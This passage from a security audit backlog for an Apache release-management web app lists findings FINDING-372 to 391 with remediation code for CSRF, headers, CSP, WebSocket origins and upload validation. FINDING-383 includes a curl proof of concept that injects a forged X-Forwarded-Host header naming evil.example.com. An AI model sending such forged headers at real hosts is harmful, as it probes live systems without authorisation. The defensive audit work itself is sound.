- [ ] Comprehensive validation when Sec-Fetch headers present
- [ ] Strict validation for modern browsers
- [ ] Legacy clients handled gracefully with logging
- [ ] Same-site policy documented or restricted
- [ ] Unit test verifying strict validation
- [ ] Unit test verifying deliberate omission is handled

### References
- Source reports: L1:3.5.3.md, L2:3.5.4.md
- Related findings: FINDING-187
- ASVS sections: 3.5.3, 3.5.4

### Priority
Low

---

## Issue: FINDING-372 - Inconsistent CSRF Enforcement Pattern on Admin POST Endpoints

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
Five admin POST endpoints use the `@admin.post()` decorator without form parameters, relying solely on global CSRFProtect middleware for CSRF validation. Nine other admin endpoints use `@admin.typed` with form parameters, providing both global and form-level CSRF validation. This creates an inconsistent defense posture.

### Details
Affected file: `atr/admin/__init__.py`
- Line 299: Endpoint 1
- Line 316: Endpoint 2
- Line 338: Endpoint 3
- Line 399: Endpoint 4
- Line 429: Endpoint 5

Blueprint: `atr/blueprints/admin.py` lines 22-30

If CSRFProtect were accidentally disabled or misconfigured (e.g., blueprint-wide exemption applied incorrectly), these 5 endpoints would lack application-level CSRF validation, while the 9 `@admin.typed` endpoints would retain form-level protection.

Currently protected by:
- Global CSRFProtect middleware
- SameSite=Strict cookies
- Sec-Fetch header validation

The inconsistency increases risk during refactoring.

### Recommended Remediation
Convert all 5 affected endpoints to `@admin.typed` with `form.Empty` parameter:

```python
from atr.shared import form

@admin.typed
async def endpoint(
    session: web.Committer,
    _endpoint_name: Literal["endpoint/path"],
    _form: form.Empty
) -> web.QuartResponse:
    """Endpoint with consistent CSRF validation."""
    # endpoint logic
```

This addresses the developer's own TODO comment in the code asking why the form is missing.

### Acceptance Criteria
- [ ] All 5 admin POST endpoints converted to @admin.typed
- [ ] form.Empty parameter added to each endpoint
- [ ] Form-level CSRF validation consistent with other admin endpoints
- [ ] TODO comment resolved
- [ ] Unit test verifying CSRF protection

### References
- Source reports: L1:3.5.1.md
- Related findings: None
- ASVS sections: 3.5.1

### Priority
Low

---

## Issue: FINDING-373 - Sec-Fetch-Mode Validation Not Applied to GET Requests on API Endpoints

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The `validate_sec_fetch_headers()` middleware explicitly excludes GET, HEAD, and OPTIONS requests from Sec-Fetch-* validation. While POST/PUT/DELETE requests are validated to prevent cross-site mutations and API navigation, GET requests to `/api/*` endpoints can be directly navigated to in the browser, rendering JSON in browser tab instead of being rejected for programmatic-only access.

### Details
Affected files:
- `atr/server.py` line ~517
- `atr/api/__init__.py`
- `atr/blueprints/api.py`

Browser address bar navigation to API endpoints succeeds with JSON rendered in browser tab.

### Recommended Remediation
Implement Sec-Fetch-Dest validation for API endpoints on all HTTP methods including GET:

```python
@app.before_request
async def validate_api_access():
    """Validate API endpoints are accessed programmatically."""
    if quart.request.path.startswith('/api/'):
        sec_fetch_dest = quart.request.headers.get('Sec-Fetch-Dest')
        
        # Block browser navigation contexts
        if sec_fetch_dest in ('document', 'iframe', 'embed', 'object'):
            raise quart.exceptions.Forbidden(
                'API must be accessed programmatically. '
                'Use curl, requests, or other HTTP client.'
            )
        
        # Allow programmatic access: 'empty', 'fetch', 'xmlhttprequest'
        # Also allow None for legacy clients
```

This blocks browser navigation contexts while allowing programmatic access.

### Acceptance Criteria
- [ ] Sec-Fetch-Dest validation applied to GET requests on /api/* endpoints
- [ ] Browser navigation contexts rejected (document, iframe, embed, object)
- [ ] Programmatic access allowed (empty, fetch, xmlhttprequest)
- [ ] Legacy clients allowed (None)
- [ ] Clear error message for browser navigation
- [ ] Unit test verifying validation

### References
- Source reports: L1:3.2.1.md
- Related findings: None
- ASVS sections: 3.2.1

### Priority
Low

---

## Issue: FINDING-374 - ZipResponse Does Not Enforce Content-Disposition: attachment

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The ZipResponse class does not automatically enforce `Content-Disposition: attachment` header, relying on callers to provide it. This is a defense-in-depth gap—ASVS 3.2.1 explicitly recommends the attachment disposition for downloadable content to prevent browser rendering and unintended content interpretation.

### Details
Affected file: `atr/web.py` lines ~218-226

While callers may provide the header, it is not enforced at the class level.

### Recommended Remediation
**Option 1: Add if missing with filename parameter**

```python
class ZipResponse:
    def __init__(self, filename: str = "download.zip", **kwargs):
        """Create ZIP response with attachment disposition."""
        headers = kwargs.get('headers', {})
        
        # Enforce Content-Disposition: attachment
        if 'Content-Disposition' not in headers:
            headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        
        kwargs['headers'] = headers
        super().__init__(**kwargs)
```

**Option 2: Always enforce regardless of caller**

```python
class ZipResponse:
    def __init__(self, filename: str = "download.zip", **kwargs):
        """Create ZIP response with forced attachment disposition."""
        headers = kwargs.get('headers', {})
        
        # Always enforce Content-Disposition: attachment (defense-in-depth)
        headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        
        kwargs['headers'] = headers
        super().__init__(**kwargs)
```

### Acceptance Criteria
- [ ] Content-Disposition: attachment header enforced
- [ ] Filename parameter added to constructor
- [ ] Defense-in-depth maintained
- [ ] Unit test verifying header is present

### References
- Source reports: L1:3.2.1.md
- Related findings: FINDING-375
- ASVS sections: 3.2.1

### Priority
Low

---

## Issue: FINDING-375 - ShellResponse Serves Executable Content Without Content-Disposition: attachment

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The ShellResponse class serves `text/x-shellscript` content without `Content-Disposition: attachment` header. While an audit_guidance comment indicates this is an intentional design decision with multiple compensating controls, ASVS 3.2.1 best practices recommend attachment header for executable content as defense-in-depth.

### Details
Affected file: `atr/web.py` lines ~209-211

Practical risk is negligible due to:
- CSP (script-src restrictions)
- X-Content-Type-Options: nosniff
- Explicit Content-Type headers

An audit_guidance comment already exists indicating this is an intentional design decision.

### Recommended Remediation
Three options:

**Option 1: Add filename parameter and always set attachment header**

```python
class ShellResponse:
    def __init__(self, content: str, filename: str = "script.sh", **kwargs):
        """Create shell script response with attachment disposition."""
        headers = kwargs.get('headers', {})
        headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        kwargs['headers'] = headers
        super().__init__(content, mimetype='text/x-shellscript', **kwargs)
```

**Option 2: Add as_attachment boolean flag for optional enforcement**

```python
class ShellResponse:
    def __init__(self, content: str, as_attachment: bool = False, filename: str = "script.sh", **kwargs):
        """Create shell script response with optional attachment disposition."""
        if as_attachment:
            headers = kwargs.get('headers', {})
            headers['Content-Disposition'] = f'attachment; filename="{filename}"'
            kwargs['headers'] = headers
        super().__init__(content, mimetype='text/x-shellscript', **kwargs)
```

**Option 3: Risk acceptance with updated audit_guidance comment**

```python
class ShellResponse:
    """
    audit_guidance: ASVS 3.2.1 LOW-003 reviewed.
    
    Content-Disposition: attachment not enforced for shell scripts due to:
    - CSP script-src restrictions prevent execution
    - X-Content-Type-Options: nosniff prevents MIME sniffing
    - Explicit text/x-shellscript Content-Type
    - Shell scripts are intentionally downloadable/viewable
    
    Risk accepted: Practical risk is negligible with compensating controls.
    """
```

### Acceptance Criteria
- [ ] Either: attachment header added OR
- [ ] Risk acceptance documented in audit_guidance comment
- [ ] Compensating controls documented
- [ ] Unit test verifying chosen approach

### References
- Source reports: L1:3.2.1.md
- Related findings: FINDING-374
- ASVS sections: 3.2.1

### Priority
Low

---

## Issue: FINDING-376 - innerHTML Read Used Where textContent Is Appropriate

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The filter function in projects-directory.js reads `.innerHTML` instead of `.textContent` to extract the project name for filtering. Since `.card-title` contains an `<a>` tag, this causes the filter to match against HTML attributes (href, class) rather than just the visible project name, resulting in incorrect filtering behavior.

### Details
In `atr/static/js/src/projects-directory.js` at line 26, the code reads `.innerHTML` when extracting text for filtering:
```javascript
const name = nameElement.innerHTML; // Wrong - includes HTML markup
```

This is a functional bug rather than a direct XSS risk since it's a read operation, but demonstrates incorrect API usage. The filter will match against HTML attributes and tags instead of only visible text.

### Recommended Remediation
Replace innerHTML read with textContent:

```javascript
const name = nameElement.textContent;
```

This correctly reads only visible text as done in committee-directory.js.

### Acceptance Criteria
- [ ] Replace `.innerHTML` with `.textContent` in projects-directory.js line 26
- [ ] Project name filtering works correctly without matching HTML markup
- [ ] Unit test verifying the fix

### References
- Source reports: L1:3.2.2.md
- ASVS sections: 3.2.2

### Priority
Low

---

## Issue: FINDING-377 - innerHTML Usage with Static Content (Defense-in-Depth)

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `createWarningDiv()` function in vote-body-duration.js uses `innerHTML` to set static, developer-controlled HTML content. While not currently vulnerable (no user-controllable data), this pattern creates maintenance risk if future modifications introduce dynamic content.

### Details
In `atr/static/js/src/vote-body-duration.js` at lines 24-26, innerHTML is used with static content. This is NOT an ASVS 3.2.2 violation because the content IS intended to be rendered as HTML (contains `<strong>`, `<br>`, `<button>` elements by design), but represents a defense-in-depth opportunity. If future modifications add user-controlled data to this content, XSS vulnerabilities could be introduced.

### Recommended Remediation
Refactor to use createElement and textContent/appendChild pattern for defense-in-depth and maintainability:

```javascript
function createWarningDiv() {
    const div = document.createElement('div');
    div.className = 'warning';
    
    const strong = document.createElement('strong');
    strong.textContent = 'Warning: ';
    div.appendChild(strong);
    
    // Continue with createElement pattern...
    return div;
}
```

### Acceptance Criteria
- [ ] Refactor createWarningDiv() to use DOM manipulation methods instead of innerHTML
- [ ] Functionality remains unchanged
- [ ] Unit test verifying the fix

### References
- Source reports: L1:3.2.2.md
- ASVS sections: 3.2.2

### Priority
Low

---

## Issue: FINDING-378 - style-src 'unsafe-inline' Weakens CSP Protection Against CSS Injection

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The style-src directive includes 'unsafe-inline', which allows any inline `<style>` elements or style attributes to be applied. If an HTML injection vulnerability exists elsewhere in the application, an attacker could inject arbitrary CSS via inline styles, potentially enabling data exfiltration through attribute selectors or visual UI redress attacks.

### Details
In `atr/server.py` at line 463, the CSP configuration includes:
```python
"style-src 'self' 'unsafe-inline'"
```

While the primary purpose of preventing malicious JavaScript execution is met (script-src 'self' does NOT include 'unsafe-inline'), CSS injection could enable:
- Data exfiltration through CSS attribute selectors
- Visual UI redress attacks
- Limited information disclosure

Practical exploitability is very low since `default-src 'self'` and `connect-src 'self'` would block external URL loads in CSS-based exfiltration attempts.

### Recommended Remediation
Replace 'unsafe-inline' with CSS nonces or hashes where feasible:

```python
# Option 1: Use per-response nonces
nonce = secrets.token_urlsafe(16)
response.headers["Content-Security-Policy"] = f"style-src 'self' 'nonce-{nonce}'"

# Option 2: Extract inline styles to external stylesheets during build
# Option 3: Document as accepted risk if Bootstrap requires inline styles
```

If 'unsafe-inline' must remain, this is an accepted risk with appropriate documentation already present in code comments.

### Acceptance Criteria
- [ ] Implement CSS nonce-based CSP or document accepted risk
- [ ] Verify Bootstrap functionality with new CSP
- [ ] Unit test verifying the fix

### References
- Source reports: L2:3.4.3.md
- ASVS sections: 3.4.3

### Priority
Low

---

## Issue: FINDING-379 - Unverifiable Session Cookie Write in atr.util

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `util.write_quart_session_cookie()` function is called during the request lifecycle but its source code is not included in the audit scope. If this function uses `response.set_cookie()` directly rather than `quart.session`, it must explicitly pass `httponly=True` to maintain compliance and prevent client-side JavaScript access to session cookies.

### Details
In `atr/server.py` at lines 316-319, `util.write_quart_session_cookie()` is called, but the implementation in `atr/util.py` is not available for verification.

If `write_quart_session_cookie` bypasses Quart's session framework and does not set HttpOnly, the session cookie would be accessible to client-side JavaScript, enabling session hijacking via XSS.

### Recommended Remediation
Verify that `atr/util.py::write_quart_session_cookie()` either:

**Option A (preferred):** Use quart.session - `quart.session[cookie_id] = session_data`

**Option B:** If using set_cookie directly, explicitly set security flags:
```python
response.set_cookie(
    key=cookie_name,
    value=cookie_value,
    httponly=True,
    secure=True,
    samesite='Strict',
    path='/'
)
```

### Acceptance Criteria
- [ ] Review atr/util.py implementation of write_quart_session_cookie()
- [ ] Verify HttpOnly flag is set (either via framework or explicitly)
- [ ] Add unit test verifying HttpOnly flag in session cookies

### References
- Source reports: L2:3.3.4.md
- ASVS sections: 3.3.4

### Priority
Low

---

## Issue: FINDING-380 - Text Response Classes Rely on Implicit Charset from Werkzeug

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Three custom response classes (TextResponse, ElementResponse, ShellResponse) specify only the mimetype parameter without explicitly including the charset. While Werkzeug automatically appends `; charset=utf-8` to all text/* mimetypes at runtime, this creates a dependency on framework implementation details rather than explicit application control.

### Details
In `atr/web.py` at approximately lines 195, 202, and 207, the response classes use:
```python
class TextResponse(quart.Response):
    def __init__(self, text: str, status: int = 200) -> None:
        super().__init__(text, status=status, mimetype="text/plain")
```

The application should explicitly specify charset parameters rather than relying on implicit framework behavior.

### Recommended Remediation
Replace mimetype parameter with explicit content_type including charset in all three response classes:

```python
class TextResponse(quart.Response):
    def __init__(self, text: str, status: int = 200) -> None:
        super().__init__(text, status=status, content_type="text/plain; charset=utf-8")

class ElementResponse(quart.Response):
    def __init__(self, element: htm.Element, status: int = 200) -> None:
        super().__init__(str(element), status=status, content_type="text/html; charset=utf-8")

class ShellResponse(quart.Response):
    def __init__(self, text: str, status: int = 200) -> None:
        super().__init__(text, status=status, content_type="text/x-shellscript; charset=utf-8")
```

Effort: Low (3 one-line changes). Risk: None (zero runtime behavior change).

### Acceptance Criteria
- [ ] Update all three response classes to use content_type with explicit charset
- [ ] Verify Content-Type headers include charset in responses
- [ ] Unit test verifying the fix

### References
- Source reports: L1:4.1.1.md
- ASVS sections: 4.1.1

### Priority
Low

---

## Issue: FINDING-381 - Library-Level WSS Enforcement Not Independently Verifiable

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application validates that the URL starts with `https://` before passing it to `asfpy.pubsub.listen()`. However, the actual TLS enforcement depends on the `asfpy.pubsub` library's implementation. If the library internally downgrades, redirects, or fails to verify TLS certificates, the application-level check would provide false confidence.

### Details
In `atr/svn/pubsub.py` at line 78, URL validation occurs before calling the library. This is an observation about defense-in-depth rather than an exploitable vulnerability. The `asfpy.pubsub` library is published by the Apache Software Foundation and is expected to properly handle HTTPS URLs with TLS.

### Recommended Remediation
Consider adding an explicit assertion or documentation that the `asfpy.pubsub` library enforces TLS for `https://` URLs:

```python
# SECURITY: asfpy.pubsub.listen() uses aiohttp internally, which enforces 
# TLS for https:// URLs. Verified in asfpy v X.Y.Z.
# Library version pinned in requirements.txt
```

Optionally:
- Pin or audit the library version
- Add runtime validation of the library's SSL behavior
- Add integration test verifying TLS connection

### Acceptance Criteria
- [ ] Add documentation comment explaining TLS enforcement by library
- [ ] Verify library version is pinned in requirements.txt
- [ ] Consider adding integration test for TLS enforcement

### References
- Source reports: L1:4.4.1.md
- ASVS sections: 4.4.1

### Priority
Low

---

## Issue: FINDING-382 - HSTS Not Applied at Application Level

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The Strict-Transport-Security header is documented as being applied by the frontend proxy, not by the application itself. While this is a valid deployment pattern, if the proxy is misconfigured or replaced, HSTS protection silently disappears with no defense-in-depth at the application layer.

### Details
The application's `add_security_headers` function in `atr/server.py` at line 497 adds several headers directly but omits HSTS. The documentation at lines 93-94 and 491-502 indicates HSTS is applied at proxy level.

Impact: If the proxy configuration changes and HSTS is removed, browsers could make initial HTTP requests, leaking data. This is lower severity because HSTS is documented as being applied at proxy level and ProxyFixMiddleware is correctly configured.

### Recommended Remediation
Add HSTS at the application level as defense-in-depth (duplicate headers are harmless and the most restrictive wins):

```python
# atr/server.py, in add_security_headers
if quart.request.is_secure:
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains"
```

### Acceptance Criteria
- [ ] Add HSTS header at application level
- [ ] Verify header only added for HTTPS requests
- [ ] Verify proxy and application HSTS headers coexist correctly
- [ ] Unit test verifying the fix

### References
- Source reports: L2:4.1.2.md
- Related findings: FINDING-196
- ASVS sections: 4.1.2

### Priority
Low

---

## Issue: FINDING-383 - Neither Vhost Sanitizes X-Forwarded-Host

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Neither the staging nor the dev vhost includes directives to sanitize `X-Forwarded-Host` or `X-Forwarded-Server` headers. This allows end-users to inject arbitrary values for these headers, which could potentially influence host-based logic if the middleware or application code processes them.

### Details
In `tooling-vm-ec2-de.apache.org.yaml`, both vhost configuration sections lack header sanitization. Currently low impact due to middleware not processing this header, but represents a defense-in-depth gap.

If middleware is changed or updated to process `X-Forwarded-Host`, the OAuth callback URL generation in `asfquart/generics.py` (lines 39-43) and the URL validation in `atr/web.py` (lines 230, 100-105) and `atr/server.py` (line 210) could be affected.

POC: `curl -k -H "X-Forwarded-Host: evil.example.com" https://release-test.apache.org/auth?login`

### Recommended Remediation
Add `RequestHeader unset X-Forwarded-Host` and `RequestHeader unset X-Forwarded-Server` to BOTH vhosts in tooling-vm-ec2-de.apache.org.yaml, before the ProxyPass directives:

```apache
RequestHeader unset X-Forwarded-Host
RequestHeader unset X-Forwarded-Server
ProxyPass / http://127.0.0.1:8000/
```

### Acceptance Criteria
- [ ] Add header sanitization to both staging and dev vhosts
- [ ] Verify X-Forwarded-Host injection no longer possible
- [ ] Integration test with header injection attempt

### References
- Source reports: L2:4.1.3.md
- Related findings: FINDING-197
- ASVS sections: 4.1.3

### Priority
Low

---

## Issue: FINDING-384 - No WebSocket Origin Validation Framework Exists

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application does not implement any WebSocket Origin header validation mechanism. While no WebSocket endpoints currently exist, the underlying framework (Quart + Hypercorn) supports WebSocket connections natively and does not disable them by default. This creates future risk if WebSocket endpoints are added without proper security controls.

### Details
Gap Analysis:
1. No WebSocket endpoints defined - Zero @app.websocket() decorators across 122 analyzed files
2. No Origin validation framework - No reusable middleware, decorator, or configuration for validating WebSocket Origin headers
3. WebSocket not explicitly disabled - Hypercorn will accept WebSocket upgrade requests by default
4. HTTP security controls don't transfer - The existing Sec-Fetch-Site CSRF protection only applies to HTTP POST requests, not WebSocket handshakes

Current impact is minimal as no WebSocket endpoints exist, but future risk is HIGH if WebSocket is added without controls. Potential vulnerabilities include Cross-Site WebSocket Hijacking (CSWSH), data exfiltration, unauthorized actions, and session hijacking.

### Recommended Remediation
**Option 1 (Recommended):** Implement reusable WebSocket Origin validation decorator. Create `src/asfquart/websocket.py` with `validate_websocket_origin` decorator that:
- Checks Origin header against ALLOWED_ORIGINS set (e.g., https://trusted-releases.apache.org, https://whimsy.apache.org)
- Rejects connections without Origin header or with disallowed origins using `quart.websocket.reject(403)`

**Option 2:** Disable WebSocket at reverse proxy level if not planned. Use Apache httpd.conf with RewriteEngine to block WebSocket upgrade requests.

**Option 3:** Configure Hypercorn WebSocket security options including `--websocket-max-size` and `--websocket-ping-interval` flags.

### Acceptance Criteria
- [ ] Document WebSocket security policy in SECURITY.md (Immediate)
- [ ] Implement validation decorator and add to code review checklist (Short-term)
- [ ] If WebSocket never planned, implement proxy-level block (Long-term)
- [ ] Add unit tests for WebSocket security controls

### References
- Source reports: L2:4.4.2.md
- Related findings: FINDING-198, FINDING-385
- ASVS sections: 4.4.2

### Priority
Low

---

## Issue: FINDING-385 - No Origin Header Validation Infrastructure for WebSocket

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
WebSocket connections are vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks where an attacker's page initiates a WebSocket connection to the target application. The browser sends cookies with the WS upgrade request, potentially authenticating the attacker's connection. No Origin header validation exists anywhere in the codebase that could be applied to WebSocket handshakes.

### Details
Grep across all files shows zero references to Origin header validation. `src/asfquart/generics.py` checks Sec-Fetch-Site (line 37) but only for HTTP POST CSRF, not WebSocket upgrades.

The absence of any Origin validation framework means if WebSocket endpoints are added in the future, they would be vulnerable to CSWSH attacks by default.

### Recommended Remediation
Include Origin validation in the WebSocket authentication framework:

```python
# Create src/asfquart/websocket.py
_ALLOWED_ORIGINS = {
    f"https://{APP_HOST}",
    # Add other trusted origins
}

def _is_allowed_origin(origin: str) -> bool:
    return origin in _ALLOWED_ORIGINS

def require_websocket(func):
    @functools.wraps(func)
    async def wrapper(*args, **kwargs):
        origin = quart.websocket.headers.get("Origin")
        if not origin or not _is_allowed_origin(origin):
            await quart.websocket.close(code=1008, reason="Invalid origin")
            return
        return await func(*args, **kwargs)
    return wrapper
```

### Acceptance Criteria
- [ ] Create WebSocket security module with Origin validation
- [ ] Document allowed origins configuration
- [ ] Add unit tests for Origin validation
- [ ] Update code review checklist

### References
- Source reports: L2:4.4.4.md
- Related findings: FINDING-384, FINDING-198
- ASVS sections: 4.4.4

### Priority
Low

---

## Issue: FINDING-386 - Inconsistent Session Context in Token Operations

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `_add_token` and `_delete_token` functions in the same file handle `session` parameter passing to `storage.write()` inconsistently. The `_add_token` function does not explicitly pass the session parameter while `_delete_token` does. This inconsistency reduces code clarity and defense-in-depth.

### Details
In `atr/post/tokens.py`:
- Lines 54-74: `_add_token()` does not explicitly pass session to `storage.write()`
- Lines 77-85: `_delete_token()` explicitly passes session to `storage.write(session)`

While this is likely functionally correct due to request context resolution, the inconsistency creates maintenance risk and could fail silently if context resolution changes.

### Recommended Remediation
Update `_add_token()` to explicitly pass `session` parameter to `storage.write(session)` for consistency with `_delete_token()` and the established pattern throughout the codebase:

```python
async def _add_token(...):
    # ... existing code ...
    async with storage.write(session) as write:  # Add session parameter
        await write.as_foundation_committer(session.asf_uid).add_token(...)
```

Establish and enforce consistent pattern across codebase — always explicitly pass `session` to `storage.write()`.

### Acceptance Criteria
- [ ] Update _add_token() to explicitly pass session parameter
- [ ] Verify all storage.write() calls use consistent pattern
- [ ] Unit test verifying the fix

### References
- Source reports: L2:4.4.3.md
- ASVS sections: 4.4.3

### Priority
Low

---

## Issue: FINDING-387 - No Client-Side File Size Validation Before Upload

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The client-side upload interface does not validate file sizes before initiating uploads. Users can select and attempt to upload files exceeding server limits. The browser uploads the entire file before receiving a 413 error from the server, wasting bandwidth and time for both client and server. This is NOT a security issue as server-side MAX_CONTENT_LENGTH enforces the limit correctly - it is purely a user experience and efficiency concern.

### Details
In `atr/static/js/src/upload-progress.js`:
- Line 123: `handleFormSubmit()` function lacks file size validation
- Line 89: No upper bound on number of files that can be selected

### Recommended Remediation
Add client-side validation in handleFormSubmit() function:

```javascript
// Define constants matching server configuration
const MAX_FILE_SIZE = 512 * 1024 * 1024; // 512MB
const MAX_FILE_COUNT = 50;

function handleFormSubmit(event) {
    const files = event.target.files;
    
    // Validate file count
    if (files.length > MAX_FILE_COUNT) {
        alert(`Maximum ${MAX_FILE_COUNT} files allowed`);
        return false;
    }
    
    // Validate individual file sizes
    const oversized = Array.from(files).filter(f => f.size > MAX_FILE_SIZE);
    if (oversized.length > 0) {
        alert(`Files exceed 512MB limit:\n${oversized.map(f => 
            `${f.name} (${(f.size / 1024 / 1024).toFixed(2)}MB)`
        ).join('\n')}`);
        return false;
    }
    
    // ... continue with upload
}
```

NOTE: This is a UX improvement only - server-side validation must remain as the security control.

### Acceptance Criteria
- [ ] Add client-side file size validation
- [ ] Add client-side file count validation
- [ ] Display helpful error messages with file details
- [ ] Add real-time validation on file input change event
- [ ] Server-side validation remains unchanged

### References
- Source reports: L1:5.2.1.md
- ASVS sections: 5.2.1

### Priority
Low

---

## Issue: FINDING-388 - KEYS File Web Upload Lacks Extension Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The KEYS file web upload endpoint accepts file uploads without validating the file extension. While the file content IS validated by PGP parsing (rejecting non-PGP content), the absence of extension checking violates ASVS 5.2.2's explicit requirement to 'check if the file extension matches an expected file extension.' The upload handler processes files with any extension (including potentially confusing extensions like .exe) as long as they contain valid PGP key data.

### Details
In `atr/post/keys.py` at lines 284-305, the `_upload_file_keys()` function processes uploaded files without verifying the file extension matches expected values such as .asc, .gpg, .key, .pub, .txt, or no extension.

### Recommended Remediation
Add file extension validation before content processing:

```python
async def _upload_file_keys(upload_file_form: shared.keys.UploadFileForm) -> str:
    if upload_file_form.key is None:
        await quart.flash("No KEYS file uploaded", "error")
        return await shared.keys.render_upload_page(error=True)

    # Validate file extension
    filename = upload_file_form.key.filename or ""
    allowed_extensions = {"", ".asc", ".gpg", ".key", ".pub", ".txt"}
    ext = pathlib.PurePath(filename).suffix.lower()
    
    if ext not in allowed_extensions:
        await quart.flash(
            f"Unexpected file extension '{ext}'. "
            f"Expected a PGP key file ({', '.join(sorted(allowed_extensions))}).",
            "error"
        )
        return await shared.keys.render_upload_page(error=True)

    keys_content = await asyncio.to_thread(upload_file_form.key.read)
    keys_text = keys_content.decode("utf-8", errors="replace")
    await _process_keys(keys_text)
```

### Acceptance Criteria
- [ ] Add file extension validation to KEYS upload handler
- [ ] Allow only expected extensions: {"", ".asc", ".gpg", ".key", ".pub", ".txt"}
- [ ] Display helpful error message for invalid extensions
- [ ] Unit test verifying extension validation

### References
- Source reports: L1:5.2.2.md
- ASVS sections: 5.2.2
- CWE: CWE-434

### Priority
Low

---

## Issue: FINDING-389 - Defense-in-Depth — Missing AllowOverride None in Apache Downloads Directory

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The Apache configuration for the /downloads/ directory does not explicitly set `AllowOverride None`, relying instead on Apache 2.4's default behavior. While the default is secure, explicit configuration provides defense-in-depth and prevents potential misconfiguration. In the unlikely scenario where AllowOverride is changed from default, uploaded .htaccess files could override `SetHandler none` and enable script execution.

### Details
In `tooling-vm-ec2-de.apache.org.yaml`:
- Lines 49-62: First vhost <Directory> block lacks `AllowOverride None`
- Lines 105-117: Second vhost <Directory> block lacks `AllowOverride None`

### Recommended Remediation
Make the security configuration explicit by adding 'AllowOverride None' to both Apache <Directory> blocks:

```yaml
<Directory /x1/atr/downloads>
    Require all granted
    SetHandler none
    AllowOverride None  # Add this line
    Options -Indexes -ExecCGI -Includes
</Directory>
```

Apply the same change to both vhost configurations.

### Acceptance Criteria
- [ ] Add `AllowOverride None` to both <Directory> blocks
- [ ] Verify .htaccess files are ignored in downloads directory
- [ ] Test upload and access of .htaccess file (should be ignored)

### References
- Source reports: L1:5.3.1.md
- Related findings: FINDING-202, FINDING-390
- ASVS sections: 5.3.1

### Priority
Low

---

## Issue: FINDING-390 - Defense-in-Depth — Incomplete Web Server Configuration File Blocking

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The safe.RelPath validation blocks SCM directories but not web server configuration files. The DISALLOWED_SUFFIXES only contains .key, missing common executable extensions. The validate_directory() function allows files with unrecognized suffixes, including .htaccess. If combined with FINDING-389 (missing AllowOverride None) and a misconfigured Apache, this could enable server-side code execution.

### Details
In `atr/models/safe.py` at lines 97-134, `atr/analysis.py` at lines 72-76, and `atr/detection.py` at lines 135-147, the validation allows:
- .htaccess files (no recognized suffix, allowed through)
- .htpasswd files
- web.config files
- Executable extensions: .php, .cgi, .pl, .py, .rb, .jsp, .asp, .aspx, .exe, .bat, .cmd, .ps1, .sh

### Recommended Remediation
Update safe.RelPath disallowed names and suffixes:

```python
# Add to disallowed names
DISALLOWED_NAMES = {
    ".git", ".svn", ".hg", ".bzr",
    ".htaccess", ".htpasswd", "web.config"
}

# Expand disallowed suffixes
DISALLOWED_SUFFIXES = {
    ".key",
    # Executable extensions
    ".php", ".cgi", ".pl", ".py", ".rb", ".jsp", 
    ".asp", ".aspx", ".exe", ".bat", ".cmd", ".ps1", ".sh"
}

# Add explicit check in validate_directory()
def validate_directory(path: pathlib.Path) -> None:
    for item in path.rglob("*"):
        if item.name in {".htaccess", ".htpasswd", "web.config"}:
            raise ValueError(f"Web server configuration file not allowed: {item.name}")
```

### Acceptance Criteria
- [ ] Add web server configuration files to disallowed names
- [ ] Expand DISALLOWED_SUFFIXES to include executable extensions
- [ ] Add explicit check in validate_directory()
- [ ] Unit tests for all blocked file types

### References
- Source reports: L1:5.3.1.md
- Related findings: FINDING-202, FINDING-389
- ASVS sections: 5.3.1

### Priority
Low

---

## Issue: FINDING-391 - Missing resolve() + is_relative_to() Defense-in-Depth in File Serving Endpoints

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
File serving endpoints rely solely on safe.RelPath validation without the secondary resolve() + is_relative_to() containment check that is consistently applied in write operations. This creates an asymmetry in defense-in-depth between read and write operations. While the primary control (safe.RelPath) is comprehensive, the lack of secondary runtime path containment verification creates an inconsistency with write operations.

### Details
In `atr/get/download.py` at approximately line 162 and `atr/get/file.py` at approximately line 126, file serving operations lack the resolve() + is_relative_to() containment check that write operations use.

### Recommended Remediation
Add resolve() + is_relative_to() containment check before file operations:

```python
async def _download_or_list(...):
    # ... existing validation ...
    
    # Add containment check
    resolved = await asyncio.to_thread(full_path.resolve)
    base_resolved = await asyncio.to_thread(base_dir.resolve)
    
    if not resolved.is_relative_to(base_resolved):
        raise base.ASFQuartException('Path traversal detected', errorcode=400)
    
    # ... continue with file operations ...
```

